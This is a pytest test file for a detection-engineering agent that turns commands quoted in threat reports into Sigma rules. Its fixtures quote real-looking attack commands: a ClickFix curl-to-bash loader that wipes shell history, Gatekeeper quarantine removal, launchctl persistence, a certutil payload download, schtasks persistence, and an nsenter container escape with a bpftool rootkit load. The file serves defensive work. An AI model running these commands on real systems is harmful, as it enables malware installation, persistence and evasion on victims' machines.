"""Process rules from commands the source shows being run."""

from typing import Any, Dict, List

import pytest

from hecate_agent.agents.llm.sigma_generator import SigmaGenerationInput, SigmaGeneratorAgent
from hecate_agent.core.command_rules import command_candidates, observed_commands

#: The Huntress ClickFix report's commands, as page extraction returns them.
HUNTRESS = """
When the page opened, the ClickFix popup appeared and instructed them to run the command shown below.
export SRC_URL='https://profitnow[.]io/' && (cd /tmp && curl -kfsSL "http://193.29.224[.]151/92392991a0cca55?force=1" -o .UlaccK
&& bash .UlaccK && rm -f .UlaccK) > /dev/null 2>&1 & clear; printf '\\033[3J'; history -d $(history 1 2>/dev/null | awk '{print $1}') 2>/dev/null; fc -p /dev/null 2>/dev/null;
The key commands executed by this "profiler/loader" component are as follows, in sequential order:
ioreg -c IOPlatformExpertDevice -d 2
: Provides details about the hardware the target uses.
curl -kFsSL [payload URL] -o [random filename]
: Downloads the Mach-O malware executable.
xattr -d com.apple.quarantine
$HOME/Library/Caches/com.apple.trustd/com.apple.verified
: Removes the Gatekeeper bit.
The payload was incorporated into BTM via
launchctl bootstrap gui/501 /Users/m1/Library/LaunchAgents/com.apple.softwareupdated.plist
.
The attackers also prompted the victim for their credentials via an osascript dialogue.
In this case, that command pulled down a Bash profiler/loader that collected system details.
Our platform combines security awareness training and a 24/7 SOC.
"""


def _selections(text: str, platforms: List[str]) -> Dict[str, str]:
    return {
        c["detection"]["selection"]["Image|endswith"]: c["detection"]["selection"]["CommandLine|contains"]
        for c in command_candidates(text, platforms)
    }


def test_the_reports_commands_become_program_and_argument_pairs() -> None:
    assert _selections(HUNTRESS, ["macOS"]) == {
        "/curl": "http://193.29.224.151/92392991a0cca55?force=1",
        "/bash": ".UlaccK",
        "/xattr": "-d com.apple.quarantine",
        "/launchctl": "bootstrap",
        "/rm": "-f .UlaccK",
        "/ioreg": "-c IOPlatformExpertDevice",
    }


def test_builtins_placeholders_and_prose_are_not_commands() -> None:
    """history and fc run inside the shell and start no process; "[payload URL]" is the report's
    placeholder; "Bash profiler/loader", "osascript dialogue" and "security awareness" are prose."""
    selections = _selections(HUNTRESS, ["macOS"])
    assert not {"/history", "/fc", "/osascript", "/security"} & set(selections)
    assert "[payload URL]" not in str(selections)


def test_a_capability_sentence_is_not_a_command_that_ran() -> None:
    text = "The toolkit can run xattr -d com.apple.quarantine on any file it downloads."
    assert command_candidates(text, ["macOS"]) == []


def test_windows_commands_on_a_windows_hunt_only() -> None:
    text = "The operator ran certutil -urlcache -split -f http://203.0.113.9/a.exe C:\\\\Users\\\\Public\\\\a.exe."
    # The first non-flag argument: the URL says more than the -urlcache flag does.
    assert _selections(text, ["Windows"]) == {"\\certutil.exe": "-f http://203.0.113.9/a.exe"}
    assert command_candidates(text, ["macOS"]) == []


def test_the_vshell_prose_yields_no_command() -> None:
    """ "launching cmd.exe and then Word" names a program; it is not a command line."""
    assert command_candidates("The resume executable was seen launching cmd.exe and then Word.", ["Windows"]) == []


def _input(commands: List[Dict[str, Any]]) -> SigmaGenerationInput:
    return SigmaGenerationInput(hypothesis="x", platforms=["macOS"], hunt_id="H-0001", observed_commands=commands)


def test_every_candidate_becomes_a_deterministic_rule_through_the_semantic_gate() -> None:
    agent = SigmaGeneratorAgent.__new__(SigmaGeneratorAgent)
    built = agent._command_rules(_input(command_candidates(HUNTRESS, ["macOS"])))
    assert built and all(problem is None for _, problem in built)
    xattr = next(rule for rule, _ in built if rule and "xattr" in rule.title)
    assert xattr.origin == "deterministic" and "xattr -d com.apple.quarantine" in xattr.rule_yaml


@pytest.mark.parametrize("program", ["ioreg", "system_profiler"])
def test_discovery_commands_are_low_level_leads(program: str) -> None:
    candidate = next(
        c
        for c in command_candidates(HUNTRESS + " system_profiler SPHardwareDataType\n", ["macOS"])
        if c["title"].startswith(program)
    )
    assert candidate["level"] == "low"


def test_a_flag_is_not_joined_to_a_path_whose_variable_was_stripped() -> None:
    """mkdir -p "$HOME/Library/x" runs as "-p /Users/me/Library/x": "-p /Library/x" never occurs."""
    text = 'The loader then ran mkdir -p "$HOME/Library/Caches/com.apple.trustd" on the Mac.'
    (command,) = observed_commands(text, ["macOS"])
    assert command.argument == "/Library/Caches/com.apple.trustd"


def test_schtasks_task_creation_generates_process_and_file_rules() -> None:
    text = 'Scheduled task creation: schtasks /create /sc minute /mo 15 /tn "UpdateCheck"'
    (cmd,) = observed_commands(text, ["Windows"])
    assert cmd.program == "schtasks"
    assert cmd.argument == "UpdateCheck"
    candidates = command_candidates(text, ["Windows"])
    assert len(candidates) == 2
    proc = next(c for c in candidates if c["category"] == "process_creation")
    assert proc["detection"]["selection"] == {
        "Image|endswith": "\\schtasks.exe",
        "CommandLine|contains": "UpdateCheck",
    }
    file_evt = next(c for c in candidates if c["category"] == "file_event")
    assert file_evt["detection"]["selection"] == {
        "TargetFilename|contains": "\\Tasks\\UpdateCheck",
    }
    agent = SigmaGeneratorAgent.__new__(SigmaGeneratorAgent)
    input_data = SigmaGenerationInput(hypothesis="x", platforms=["Windows"], hunt_id="H-0002", observed_commands=candidates)
    built = agent._command_rules(input_data)
    assert len(built) == 2
    assert all(problem is None for _, problem in built)
    categories = {rule.logsource_category for rule, _ in built if rule}
    assert categories == {"process_creation", "file_event"}


def test_linux_markers_fallback_includes_unix_on_windows_hunt() -> None:
    text = (
        "Adversaries obtained initial access and executed nsenter -t 1 -m -u -i -n -p /bin/bash "
        "to escape container namespaces. They subsequently executed bpftool prog load /tmp/.kprobe_filter.o "
        "to deploy an eBPF stealth rootkit."
    )
    # platforms only specifies Windows, but text contains Linux markers
    cmds = observed_commands(text, platforms=["Windows"])
    progs = {c.program for c in cmds}
    assert "nsenter" in progs
    assert "bpftool" in progs

    candidates = command_candidates(text, platforms=["Windows"])
    nsenter_cand = next(c for c in candidates if "nsenter" in c["title"])
    assert nsenter_cand["platform"] == "unix"
    assert nsenter_cand["detection"]["selection"]["Image|endswith"] == "/nsenter"

    agent = SigmaGeneratorAgent.__new__(SigmaGeneratorAgent)
    input_data = SigmaGenerationInput(
        hypothesis="Container escape to Linux host",
        platforms=["Windows"],
        hunt_id="H-0833",
        observed_commands=candidates,
    )
    built = agent._command_rules(input_data)
    assert len(built) >= 2
    import yaml

    for rule, prob in built:
        assert prob is None
        assert rule is not None
        doc = yaml.safe_load(rule.rule_yaml)
        if "/nsenter" in rule.rule_yaml or "/bpftool" in rule.rule_yaml:
            assert doc["logsource"]["product"] == "linux"
